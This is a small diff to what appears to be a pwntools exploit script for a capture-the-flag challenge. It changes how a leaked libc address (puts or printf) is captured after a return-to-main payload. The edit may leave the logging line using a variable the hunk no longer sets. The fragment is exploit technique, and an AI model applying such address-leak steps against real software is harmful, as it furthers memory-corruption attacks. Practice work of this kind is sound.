@@ -33,7 +33,7 @@ p.sendlineafter(PROMPT, flat(
         elf.symbols['main']
 ))
 p.recvline() # program might send multiple lines of nonsense
-puts_libc = u64(p.recvline().strip().ljust(8, b"\x00")) # standard
+printf_libc = u64(p.recvline().strip().ljust(8, b"\x00")) # standard
 
 log.success("libc puts is: " + hex(puts_libc))
 log.success("libc printf is: " + hex(printf_libc))
